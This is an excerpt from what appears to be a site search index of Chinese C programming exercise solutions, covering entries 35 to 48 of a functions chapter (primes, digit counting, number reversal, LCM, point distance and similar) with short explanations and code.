<li>\u6700\u540e\u4e00\u884c\u8f93\u51fa\u5b8c\u540e\uff0c\u5355\u72ec\u5904\u7406\u8f93\u51fa\u6700\u540e\u4e00\u884c\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u6570\u5b57\u524d\u6ca1\u6709\u7a7a\u683c\u3002</li> <li>\u4e3b\u51fd\u6570\u4e2d\u901a\u8fc7\u7528\u6237\u8f93\u5165\u786e\u5b9a\u91d1\u5b57\u5854\u7684\u5c42\u6570\uff0c\u5e76\u8c03\u7528 <code>hollow_pyramid</code> \u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5c42\u6570\u7684\u7a7a\u5fc3\u6570\u5b57\u91d1\u5b57\u5854\u3002</li> </ol> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid hollow_pyramid(int n) {\n    // \u5faa\u73af\u63a7\u5236\u91d1\u5b57\u5854\u7684\u5c42\u6570\n    for (int i = 1; i &lt; n; i++) {\n        // \u6253\u5370\u7a7a\u683c\n        for (int j = 1; j &lt;= n - i; j++) {\n            printf(\" \");\n        }\n\n        // \u6253\u5370\u5de6\u4fa7\u6570\u5b57\n        printf(\"%d\", i);\n\n        // \u6253\u5370\u4e2d\u95f4\u7a7a\u683c\u6216\u91cd\u590d\u6570\u5b57\n        if (i &gt; 1) {\n            for (int k = 1; k &lt;= 2 * (i - 1) - 1; k++) {\n                printf(\" \");\n            }\n            printf(\"%d\", i);\n        }\n\n        // \u6253\u5370\u6362\u884c\n        printf(\"\\n\");\n    }\n\n    // \u6253\u5370\u6700\u540e\u4e00\u884c\n    for (int i = 1; i &lt;= 2 * n - 1; i++) {\n        printf(\"%d\", n);\n    }\n}\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n\n    hollow_pyramid(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#36","title":"36","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>search</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e09\u4f4d\u6570\u7684\u6b63\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u904d\u5386\u533a\u95f4 <code>[101, n]</code> \u5185\u7684\u6240\u6709\u6570\uff0c\u5224\u65ad\u6bcf\u4e2a\u6570\u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\u4e14\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\uff0c\u7edf\u8ba1\u6ee1\u8db3\u6761\u4ef6\u7684\u6570\u7684\u4e2a\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e0a\u9650 <code>n</code>\uff0c\u7136\u540e\u8c03\u7528 <code>search</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint search(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165\u4e0a\u9650\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u7edf\u8ba1\u6ee1\u8db3\u6761\u4ef6\u7684\u6570\u7684\u4e2a\u6570\n    int count = search(n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", count);\n\n    return 0;\n}\n\n// \u7edf\u8ba1\u6ee1\u8db3\u6761\u4ef6\u7684\u4e09\u4f4d\u6570\u4e2a\u6570\u7684\u51fd\u6570\nint search(int n) {\n    int count = 0;\n\n    // \u904d\u5386\u4e09\u4f4d\u6570\u8303\u56f4\n    for (int i = 101; i &lt;= n; i++) {\n        // \u5224\u65ad\u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\n        int sqrt_i = sqrt(i);\n        if (sqrt_i * sqrt_i == i) {\n            // \u5224\u65ad\u662f\u5426\u6709\u4e24\u4f4d\u6570\u5b57\u76f8\u540c\n            int digit1 = i / 100;\n            int digit2 = (i / 10) % 10;\n            int digit3 = i % 10;\n            if (digit1 == digit2 || digit2 == digit3 || digit1 == digit3) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#37","title":"37","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>is_prime</code> \u51fd\u6570\u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u4e3a\u7d20\u6570\uff0c<code>find_twin_primes</code> \u51fd\u6570\u5bfb\u627e\u5927\u4e8e\u8f93\u5165\u6574\u6570 <code>number</code> \u7684\u6700\u5c0f\u7684\u4e00\u5bf9\u5b6a\u751f\u7d20\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>find_twin_primes</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint is_prime(int num);\nvoid find_twin_primes(int number);\n\nint main() {\n    int number;\n\n    // \u8f93\u5165\u4e00\u4e2a\u6574\u6570\n    scanf(\"%d\", &amp;number);\n\n    // \u5bfb\u627e\u5927\u4e8enumber\u7684\u6700\u5c0f\u7684\u4e00\u5bf9\u5b6a\u751f\u7d20\u6570\n    find_twin_primes(number);\n\n    return 0;\n}\n\n// \u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u4e3a\u7d20\u6570\u7684\u51fd\u6570\nint is_prime(int num) {\n    if (num &lt; 2) {\n        return 0;\n    }\n\n    for (int i = 2; i * i &lt;= num; i++) {\n        if (num % i == 0) {\n            return 0; // \u4e0d\u662f\u7d20\u6570\n        }\n    }\n\n    return 1; // \u662f\u7d20\u6570\n}\n\n// \u5bfb\u627e\u5927\u4e8enumber\u7684\u6700\u5c0f\u7684\u4e00\u5bf9\u5b6a\u751f\u7d20\u6570\u7684\u51fd\u6570\nvoid find_twin_primes(int number) {\n    int found = 0;\n    int i = number + 1;\n\n    while (!found) {\n        if (is_prime(i) &amp;&amp; is_prime(i + 2)) {\n            printf(\"%d %d\\n\", i, i + 2);\n            found = 1;\n        }\n        i++;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#38","title":"38","text":"<p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c<code>is</code>\u51fd\u6570\u7528\u4e8e\u5224\u65ad\u7ed9\u5b9a\u6b63\u6574\u6570\u7684\u5404\u4f4d\u6570\u5b57\u4e4b\u548c\u662f\u5426\u7b49\u4e8e5\u3002\u901a\u8fc7\u5faa\u73af\u904d\u5386\u6574\u6570\u7684\u6bcf\u4e00\u4f4d\uff0c\u5c06\u5404\u4f4d\u6570\u5b57\u76f8\u52a0\u5e76\u4e0e5\u8fdb\u884c\u6bd4\u8f83\u3002</p> <p><code>count_sum</code>\u51fd\u6570\u5229\u7528<code>is</code>\u51fd\u6570\u7edf\u8ba1\u7ed9\u5b9a\u533a\u95f4[a, b]\u5185\u6ee1\u8db3\u5404\u4f4d\u6570\u5b57\u4e4b\u548c\u7b49\u4e8e5\u7684\u6574\u6570\uff0c\u5e76\u8ba1\u7b97\u8fd9\u4e9b\u6574\u6570\u7684\u548c\u3002\u901a\u8fc7\u5faa\u73af\u904d\u5386\u533a\u95f4\u5185\u7684\u6bcf\u4e2a\u6574\u6570\uff0c\u8c03\u7528<code>is</code>\u51fd\u6570\u5224\u65ad\u662f\u5426\u6ee1\u8db3\u6761\u4ef6\uff0c\u5982\u679c\u6ee1\u8db3\uff0c\u5219\u5c06\u8ba1\u6570\u52a01\uff0c\u5e76\u5c06\u8be5\u6574\u6570\u7d2f\u52a0\u5230\u603b\u548c\u4e2d\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u533a\u95f4\u7684\u8d77\u59cb\u503c\u548c\u7ed3\u675f\u503ca\u3001b\uff0c\u7136\u540e\u8c03\u7528<code>count_sum</code>\u51fd\u6570\u7edf\u8ba1\u6ee1\u8db3\u6761\u4ef6\u7684\u6574\u6570\u4e2a\u6570\u548c\u5b83\u4eec\u7684\u548c\uff0c\u5e76\u5c06\u7ed3\u679c\u6253\u5370\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint is(int number) {\n    int sum = 0;\n    while (number &gt; 0) {\n        sum += number % 10;  // \u53d6\u4e2a\u4f4d\u6570\u5b57\u5e76\u7d2f\u52a0\n        number /= 10;       // \u53bb\u6389\u4e2a\u4f4d\u6570\u5b57\n    }\n    return (sum == 5);\n}\n\nint count_sum(int a, int b) {\n    int count = 0;\n    int sum = 0;\n\n    for (int i = a; i &lt;= b; i++) {\n        if (is(i)) {\n            count++;\n            sum += i;\n        }\n    }\n\n    printf(\"%d\\n\", count);\n    return sum;\n}\n\nint main() {\n    int a, b;\n    scanf(\"%d %d\", &amp;a, &amp;b);\n\n    int result = count_sum(a, b);\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#39","title":"39","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>reverse</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code>\uff0c\u7136\u540e\u4f7f\u7528\u5faa\u73af\u5c06 <code>n</code> \u7684\u5404\u4f4d\u9006\u5e8f\u6392\u5217\u5f97\u5230 <code>reversed</code>\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>reverse</code> \u51fd\u6570\u6c42\u9006\u5e8f\u6570\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint reverse(int n);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    // \u8c03\u7528\u51fd\u6570\u6c42\u9006\u5e8f\u6570\u5e76\u8f93\u51fa\u7ed3\u679c\n    int result = reverse(num);\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u6c42\u6574\u6570\u7684\u9006\u5e8f\u6570\u7684\u51fd\u6570\nint reverse(int n) {\n    int reversed = 0;\n\n    while (n != 0) {\n        reversed = reversed * 10 + n % 10;\n        n /= 10;\n    }\n\n    return reversed;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#40","title":"40","text":"<p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c<code>reciprocal</code>\u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u53c2\u6570<code>number</code>\u7684\u5012\u6570\u3002\u5982\u679c<code>number</code>\u4e3a0\uff0c\u5219\u8f93\u51fa\"\u6ca1\u6709\u5012\u6570\"\u5e76\u8fd4\u56de0\uff1b\u5426\u5219\uff0c\u8fd4\u56de1.0\u9664\u4ee5<code>number</code>\u7684\u7ed3\u679c\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u4e00\u4e2a\u5b9e\u6570<code>number</code>\uff0c\u7136\u540e\u8c03\u7528<code>reciprocal</code>\u51fd\u6570\u8ba1\u7b97\u5176\u5012\u6570\u5e76\u5c06\u7ed3\u679c\u6253\u5370\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\ndouble reciprocal(double number) {\n    if (number == 0) {\n        printf(\"\u6ca1\u6709\u5012\u6570\\n\");\n        return 0;\n    } else {\n        return 1.0 / number;\n    }\n}\n\nint main() {\n    double number;\n    scanf(\"%lf\", &amp;number);\n\n    double result = reciprocal(number);\n    printf(\"%lf\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#41","title":"41","text":"<p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u9996\u5148\u5bf9\u8f93\u5165\u7684\u7279\u6b8a\u60c5\u51b5\u8fdb\u884c\u5224\u65ad\u3002\u5982\u679c<code>number1</code>\u548c<code>number2</code>\u5747\u4e3a0\uff0c\u5219\u76f4\u63a5\u8fd4\u56de1\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u8f93\u5165\u5f85\u67e5\u627e\u7684\u6574\u6570<code>number1</code>\u548c\u7279\u5b9a\u7684\u6570\u5b57<code>number2</code>\uff0c\u8c03\u7528<code>count_digit</code>\u51fd\u6570\u7edf\u8ba1<code>number1</code>\u4e2d<code>number2</code>\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u5e76\u5c06\u7ed3\u679c\u6253\u5370\u8f93\u51fa\u3002<code>count_digit</code>\u51fd\u6570\u7528\u4e8e\u7edf\u8ba1\u53c2\u6570<code>number1</code>\u4e2d\u67d0\u4e2a\u6570\u5b57<code>number2</code>\u51fa\u73b0\u7684\u6b21\u6570\u3002\u901a\u8fc7\u5faa\u73af\u904d\u5386<code>number1</code>\u7684\u6bcf\u4e00\u4f4d\u6570\u5b57\uff0c\u5c06\u5176\u4e0e<code>number2</code>\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u7b49\uff0c\u5219\u8ba1\u6570\u5668\u52a01\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u5f85\u67e5\u627e\u7684\u6574\u6570<code>number1</code>\u548c\u7279\u5b9a\u7684\u6570\u5b57<code>number2</code>\uff0c\u7136\u540e\u8c03\u7528<code>count_digit</code>\u51fd\u6570\u7edf\u8ba1<code>number1</code>\u4e2d<code>number2</code>\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u5e76\u5c06\u7ed3\u679c\u6253\u5370\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint count_digit(int number1, int number2) {\n    int count = 0;\n\n    if (number1 == 0 &amp;&amp; number2 == 0) {\n        return 1;\n    }\n\n    while (number1 &gt; 0) {\n        int digit = number1 % 10;  // \u53d6\u4e2a\u4f4d\u6570\u5b57\n        if (digit == number2) {\n            count++;\n        }\n        number1 /= 10;  // \u53bb\u6389\u4e2a\u4f4d\u6570\u5b57\n    }\n\n    return count;\n}\n\nint main() {\n    int number1, number2;\n    scanf(\"%d\", &amp;number1);\n    scanf(\"%d\", &amp;number2);\n\n    int result = count_digit(number1, number2);\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#42","title":"42","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>total_resistance</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u7535\u963b\u963b\u503c <code>resistance1</code> \u548c <code>resistance2</code>\uff0c\u7136\u540e\u4f7f\u7528\u516c\u5f0f\u8ba1\u7b97\u5e76\u8054\u7535\u963b\u963b\u503c\uff0c\u5e76\u8fd4\u56de\u7ed3\u679c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u7535\u963b\u963b\u503c\uff0c\u7136\u540e\u8c03\u7528 <code>total_resistance</code> \u51fd\u6570\u8ba1\u7b97\u5e76\u8054\u7535\u963b\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\ndouble total_resistance(double resistance1, double resistance2);\n\nint main() {\n    double res1, res2;\n\n    // \u8f93\u5165\u4e24\u4e2a\u7535\u963b\u963b\u503c\n    scanf(\"%lf %lf\", &amp;res1, &amp;res2);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u5e76\u8054\u7535\u963b\u5e76\u8f93\u51fa\u7ed3\u679c\n    double result = total_resistance(res1, res2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%.6lf\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u5e76\u8054\u7535\u963b\u7684\u51fd\u6570\ndouble total_resistance(double resistance1, double resistance2) {\n    // \u8ba1\u7b97\u5e76\u8054\u7535\u963b\u963b\u503c\n    double result = 1 / (1 / resistance1 + 1 / resistance2);\n\n    return result;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#43","title":"43","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fn</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u6574\u6570 <code>a</code> \u548c <code>n</code>\uff0c\u7136\u540e\u8ba1\u7b97n\u4e2aa\u7ec4\u6210\u7684\u6570\u5b57\u3002<code>SumA</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u6574\u6570 <code>a</code> \u548c <code>n</code>\uff0c\u7136\u540e\u4f7f\u7528 <code>fn</code> \u51fd\u6570\u8ba1\u7b97\u7279\u6b8aa\u4e32\u6570\u5217\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570a\u548cn\uff0c\u7136\u540e\u8c03\u7528 <code>fn</code> \u51fd\u6570\u8ba1\u7b97n\u4e2aa\u7ec4\u6210\u7684\u6570\u5b57\uff0c\u8c03\u7528 <code>SumA</code> \u51fd\u6570\u8ba1\u7b97\u7279\u6b8aa\u4e32\u6570\u5217\u548c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint fn(int a, int n);\nint SumA(int a, int n);\n\nint main() {\n    int a, n;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570a\u548cn\n    scanf(\"%d %d\", &amp;a, &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97n\u4e2aa\u7ec4\u6210\u7684\u6570\u5b57\n    int fn_result = fn(a, n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7279\u6b8aa\u4e32\u6570\u5217\u548c\n    int sum_result = SumA(a, n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"fn(%d, %d) = %d\\n\", a, n, fn_result);\n    printf(\"s = %d\\n\", sum_result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97n\u4e2aa\u7ec4\u6210\u7684\u6570\u5b57\u7684\u51fd\u6570\nint fn(int a, int n) {\n    int result = 0;\n    for (int i = 0; i &lt; n; i++) {\n        result = result * 10 + a;\n    }\n    return result;\n}\n\n// \u8ba1\u7b97\u7279\u6b8aa\u4e32\u6570\u5217\u548c\u7684\u51fd\u6570\nint SumA(int a, int n) {\n    int sum = 0;\n    for (int i = 1; i &lt;= n; i++) {\n        sum += fn(a, i);\n    }\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#44","title":"44","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>common_multiple</code> \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u6574\u6570 <code>number1</code> \u548c <code>number2</code>\uff0c\u7136\u540e\u4f7f\u7528\u5faa\u73af\u627e\u5230\u5b83\u4eec\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>common_multiple</code> \u51fd\u6570\u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint common_multiple(int number1, int number2);\n\nint main() {\n    int number1, number2;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n\n    scanf(\"%d %d\", &amp;number1, &amp;number2);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570\n    int result = common_multiple(number1, number2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570\u7684\u51fd\u6570\nint common_multiple(int number1, int number2) {\n    int max = (number1 &gt; number2) ? number1 : number2;\n\n    while (1) {\n        if (max % number1 == 0 &amp;&amp; max % number2 == 0) {\n            return max;\n        }\n        max++;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#45","title":"45","text":"<p>\u51fd\u6570 <code>CountDigit</code>\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a<code>number</code> \u8868\u793a\u4e00\u4e2a\u6574\u6570\uff0c<code>digit</code> \u8868\u793a\u8981\u7edf\u8ba1\u7684\u6570\u5b57\u3002\u51fd\u6570\u7684\u529f\u80fd\u662f\u7edf\u8ba1\u6574\u6570 <code>number</code> \u4e2d\u5305\u542b\u591a\u5c11\u4e2a\u6307\u5b9a\u7684\u6570\u5b57 <code>digit</code>\u3002</p> <p>\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <ol> <li>\u521d\u59cb\u5316\u8ba1\u6570\u5668 <code>count</code> \u4e3a 0\u3002</li> <li>\u5982\u679c\u8f93\u5165\u7684\u6574\u6570 <code>number</code> \u662f\u8d1f\u6570\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u6b63\u6570\u3002</li> <li>\u8fdb\u5165\u5faa\u73af\uff0c\u53d6\u51fa <code>number</code> \u7684\u6700\u4f4e\u4f4d\u6570\u5b57\uff0c\u5e76\u4e0e\u6307\u5b9a\u7684\u6570\u5b57 <code>digit</code> \u8fdb\u884c\u6bd4\u8f83\u3002</li> <li>\u5982\u679c\u6700\u4f4e\u4f4d\u6570\u5b57\u7b49\u4e8e <code>digit</code>\uff0c\u5219\u5c06\u8ba1\u6570\u5668 <code>count</code> \u52a0\u4e00\u3002</li> <li>\u53bb\u9664 <code>number</code> \u7684\u6700\u4f4e\u4f4d\u6570\u5b57\uff0c\u7ee7\u7eed\u5faa\u73af\u76f4\u5230 <code>number</code> \u53d8\u4e3a 0\u3002</li> <li>\u8fd4\u56de\u8ba1\u6570\u5668 <code>count</code>\u3002</li> </ol> <p>\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6574\u6570 <code>number</code> \u548c\u4e00\u4e2a\u6307\u5b9a\u7684\u6570\u5b57 <code>digit</code>\uff0c\u7136\u540e\u8c03\u7528 <code>CountDigit</code> \u51fd\u6570\uff0c\u5c06\u7ed3\u679c\u6253\u5370\u8f93\u51fa\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7edf\u8ba1\u6570\u5b57 2 \u5728\u6574\u6570 -21252 \u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n//\u8bf7\u5728\u8fd9\u91cc\u5b8c\u6210\u4f60\u7684\u4ee3\u7801\nint CountDigit(int number, int digit)\n{\n    int count = 0;\n    int remainder;\n    if (number &lt; 0)\n    {\n        number = -number; // \u5982\u679c number \u4e3a\u8d1f\u6570\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u6b63\u6570\n    }\n    if (number == 0 &amp;&amp; number == digit) { count = 1; }\n    while (number &gt; 0)\n    {\n        remainder = number % 10; // \u53d6\u51fa number \u7684\u6700\u4f4e\u4f4d\u6570\u5b57\n        if (remainder == digit)\n        {\n            count++; // \u5982\u679c\u6700\u4f4e\u4f4d\u6570\u5b57\u7b49\u4e8e\u6307\u5b9a\u7684\u6570\u5b57\uff0c\u8ba1\u6570\u5668\u52a0\u4e00\n        }\n        number /= 10; // \u53bb\u9664 number \u7684\u6700\u4f4e\u4f4d\u6570\u5b57\n    }\n\n    return count;\n}\n\nint main()\n{\n    int number, digit;\n\n    scanf(\"%d %d\", &amp;number, &amp;digit);\n    printf(\"Number of digit %d in %d: %d\\n\", digit, number, CountDigit(number, digit));\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#46","title":"46","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>prime</code> \u51fd\u6570\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u6574\u6570\u662f\u5426\u4e3a\u7d20\u6570\uff0c<code>PrimeSum</code> \u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u7ed9\u5b9a\u533a\u95f4\u5185\u7684\u7d20\u6570\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u533a\u95f4\u7684\u4e24\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>PrimeSum</code> \u51fd\u6570\u8ba1\u7b97\u7d20\u6570\u548c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint prime(int p);\nint PrimeSum(int m, int n);\n\nint main() {\n    int m, n;\n\n    // \u8f93\u5165\u533a\u95f4\n    scanf(\"%d %d\", &amp;m, &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7d20\u6570\u548c\n    int sum = PrimeSum(m, n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"Sum of (\");\n    for (int i = m; i &lt;= n; i++) {\n        if (prime(i)) {\n            printf(\" %d\", i);\n        }\n    }\n    printf(\" ) = %d\\n\", sum);\n\n    return 0;\n}\n\n// \u5224\u65ad\u662f\u5426\u4e3a\u7d20\u6570\u7684\u51fd\u6570\nint prime(int p) {\n    if (p &lt;= 1) {\n        return 0; // \u4e0d\u662f\u7d20\u6570\n    }\n    for (int i = 2; i * i &lt;= p; i++) {\n        if (p % i == 0) {\n            return 0; // \u4e0d\u662f\u7d20\u6570\n        }\n    }\n    return 1; // \u662f\u7d20\u6570\n}\n\n// \u8ba1\u7b97\u7d20\u6570\u548c\u7684\u51fd\u6570\nint PrimeSum(int m, int n) {\n    int sum = 0;\n    for (int i = m; i &lt;= n; i++) {\n        if (prime(i)) {\n            sum += i;\n        }\n    }\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#47","title":"47","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>dist</code> \u51fd\u6570\u63a5\u6536\u4e24\u70b9\u7684\u5750\u6807\uff0c\u4f7f\u7528\u6570\u5b66\u5e93\u4e2d\u7684 <code>sqrt</code> \u51fd\u6570\u8ba1\u7b97\u5e73\u65b9\u6839\uff0c<code>pow</code> \u51fd\u6570\u8ba1\u7b97\u6b21\u65b9\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa\u4e24\u70b9\u95f4\u7684\u8ddd\u79bb\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u70b9\u5750\u6807\uff0c\u8c03\u7528 <code>dist</code> \u51fd\u6570\u8ba1\u7b97\u8ddd\u79bb\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\ndouble dist(int x1, int y1, int x2, int y2);\n\nint main() {\n    int x1, y1, x2, y2;\n\n    // \u8f93\u5165\u4e24\u70b9\u5750\u6807\n    scanf(\"%d %d %d %d\", &amp;x1, &amp;y1, &amp;x2, &amp;y2);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u8ddd\u79bb\n    double distance = dist(x1, y1, x2, y2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"dist = %.2lf\\n\", distance);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u4e24\u70b9\u95f4\u8ddd\u79bb\u7684\u51fd\u6570\ndouble dist(int x1, int y1, int x2, int y2) {\n    return sqrt(pow(x2 - x1, 2) + pow(y2 - y1, 2));\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#48","title":"48","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>even</code> \u51fd\u6570\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u6574\u6570\u7684\u5947\u5076\u6027\uff0c\u8fd4\u56de1\u8868\u793a\u5076\u6570\uff0c\u8fd4\u56de0\u8868\u793a\u5947\u6570\u3002<code>OddSum</code> \u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u7ed9\u5b9a\u6574\u6570\u5217\u8868\u4e2d\u6240\u6709\u5947\u6570\u7684\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u6574\u6570\u7684\u4e2a\u6570\u548c\u6574\u6570\u5217\u8868\uff0c\u7136\u540e\u8c03\u7528 <code>OddSum</code> 